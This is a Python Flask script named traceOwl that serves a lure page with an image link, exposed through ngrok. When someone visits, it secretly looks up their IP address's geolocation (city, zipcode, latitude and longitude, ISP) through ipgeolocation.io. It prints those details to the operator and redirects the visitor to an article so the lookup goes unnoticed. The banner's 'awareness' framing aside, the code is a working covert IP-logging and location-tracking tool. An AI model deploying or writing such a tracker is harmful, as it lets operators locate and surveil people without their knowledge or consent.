import argparse
from flask import Flask, request, redirect, render_template_string
import requests
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)

# Global variables for URLs and title
image_url = ''
link_url = ''
page_title = ''
API_KEY = ''



# Function to get geolocation and format it
def get_geolocation(ip):
    url = f"https://api.ipgeolocation.io/ipgeo?apiKey={API_KEY}&ip={ip}"
    response = requests.get(url)
    data = response.json()

    print("")

    formatted_data = f"""

    {Fore.YELLOW}IP:{Fore.RESET} {Fore.GREEN}{data.get('ip')}{Fore.RESET}
    {Fore.YELLOW}Continent:{Fore.RESET} {Fore.GREEN}{data.get('continent_name')}{Fore.RESET}
    {Fore.YELLOW}Country:{Fore.RESET} {Fore.GREEN}{data.get('country_name')}{Fore.RESET}
    {Fore.YELLOW}Country Code:{Fore.RESET} {Fore.GREEN}{data.get('country_code2')}{Fore.RESET}
    {Fore.YELLOW}State:{Fore.RESET} {Fore.GREEN}{data.get('state_prov')}{Fore.RESET}
    {Fore.YELLOW}City:{Fore.RESET} {Fore.GREEN}{data.get('city')}{Fore.RESET}
    {Fore.YELLOW}Zipcode:{Fore.RESET} {Fore.GREEN}{data.get('zipcode')}{Fore.RESET}
    {Fore.YELLOW}Latitude:{Fore.RESET} {Fore.GREEN}{data.get('latitude')}{Fore.RESET}
    {Fore.YELLOW}Longitude:{Fore.RESET} {Fore.GREEN}{data.get('longitude')}{Fore.RESET}
    {Fore.YELLOW}ISP:{Fore.RESET} {Fore.GREEN}{data.get('isp')}{Fore.RESET}
    {Fore.YELLOW}Organization:{Fore.RESET} {Fore.GREEN}{data.get('organization')}{Fore.RESET}
    {Fore.YELLOW}Time Zone:{Fore.RESET} {Fore.GREEN}{data.get('time_zone', {}).get('name')}{Fore.RESET}
    {Fore.YELLOW}Current Time:{Fore.RESET} {Fore.GREEN}{data.get('time_zone', {}).get('current_time')}{Fore.RESET}
    """

    return formatted_data.strip()

print("")

@app.route('/')
def index():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    geolocation_data = get_geolocation(user_ip)
    # Save or process geolocation data as needed
    print(Fore.GREEN + f"Geolocation for {user_ip}:\n{geolocation_data}")
    return redirect(link_url)

@app.route('/image')
def image_page():
    global image_url, link_url, page_title
    page_template = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{page_title}</title>
    </head>
    <body>
        <a href="{link_url}">
            <img src="{image_url}" alt="Attractive Image" style="width:100%;">
        </a>
    </body>
    </html>
    """
    return render_template_string(page_template)

def main():
    global image_url, link_url, page_title, API_KEY

    parser = argparse.ArgumentParser(description='traceOwl Configuration')
    parser.add_argument('--image', type=str, help='URL of the image')
    parser.add_argument('--article', type=str, help='URL of the redirection article')
    parser.add_argument('--title', type=str, help='Title of the webpage')
    parser.add_argument('--apikey', type=str, help='API key for ipgeolocation.io', required=True)
    parser.add_argument('--ngrok', type=str, help='Ngrok URL', required=True)

    args = parser.parse_args()

    if args.image:
        image_url = args.image
    if args.article:
        link_url = args.article
    if args.title:
        page_title = args.title
    if args.apikey:
        API_KEY = args.apikey
    if args.ngrok:
        ngrok_url = args.ngrok

    if not image_url or not ngrok_url or not page_title or not link_url:
        print(Fore.RED + "ERROR: The URLs for the image, the article, the ngrok URL, and the title must be set.")
        return

    print(Fore.WHITE + """
                                            
 ░▒                                      ▒░ 
 ░██░                                  ▒██░ 
 ░████                               ░████░ 
  ▒██████▒                       ░▒██████░     
   ▓████████     ░▒▒▒▒▒▒▒▒░    ░████████▓      
  ░▒▓████████░███████████████▓░████████▒▒      
   ▓▓▒████████▒██████████████▒████████▒█▓   
    ▒██▒████████████████████████████▒██▒    
     ░▓██████████████████████████████▓      
      ██▓▒███████████████████████▓░██▒      
     ▒████  ▒██████████████████░  ████▒     
    ░████  ░█▒░██████████████░▒█  ░████     
    ░███▒  ▒█   ░█████████▓░  ▒█░  ▒███░    
    ░███░   ██    ▒██████▒    ██   ▒███░    
    ░████░   ▒▓███▒░▒██░░▒███▓░   ▒████     
     ▒█████░        ████        ▒█████▒     
     ░████████░     ████     ░████████      
    ░████████████░  ░██   ▒████████████░    Version: 1.0.0 
    ████████████████░▓▒░███████████████▓    Web: davenisc.com
   ▒███▓░           ░▓▒░           ▒████░   Dev: @davenisc
   ▒░                                  ▒▒   
           ███████████                                          ███████                    ████ 
          ░█░░░███░░░█                                        ███░░░░░███                 ░░███ 
          ░   ░███  ░  ████████   ██████    ██████   ██████  ███     ░░███ █████ ███ █████ ░███ 
              ░███    ░░███░░███ ░░░░░███  ███░░███ ███░░███░███      ░███░░███ ░███░░███  ░███ 
              ░███     ░███ ░░░   ███████ ░███ ░░░ ░███████ ░███      ░███ ░███ ░███ ░███  ░███ 
              ░███     ░███      ███░░███ ░███  ███░███░░░  ░░███     ███  ░░███████████   ░███ 
              █████    █████    ░░████████░░██████ ░░██████  ░░░███████░    ░░████░████    █████
              ░░░░░    ░░░░░      ░░░░░░░░  ░░░░░░   ░░░░░░     ░░░░░░░       ░░░░ ░░░░    ░░░░░ 
                                            
    """ + Style.RESET_ALL + Fore.YELLOW + """
        traceOwl - The tool for tracking and raising awareness about suspicious links 🦉
    """ + Style.RESET_ALL)

    print(Fore.YELLOW + "Image URL: " +Fore.GREEN+ f"{image_url}")
    print(Fore.YELLOW + "Ngrok URL: " +Fore.GREEN+ f"{ngrok_url}")
    print(Fore.YELLOW + "Redirection URL: " +Fore.GREEN+ f"{link_url}")
    print(Fore.YELLOW + "Page Title: " +Fore.GREEN+ f"{page_title}")
    print("")
    app.run(host='0.0.0.0', port=8000)

if __name__ == '__main__':
    main()



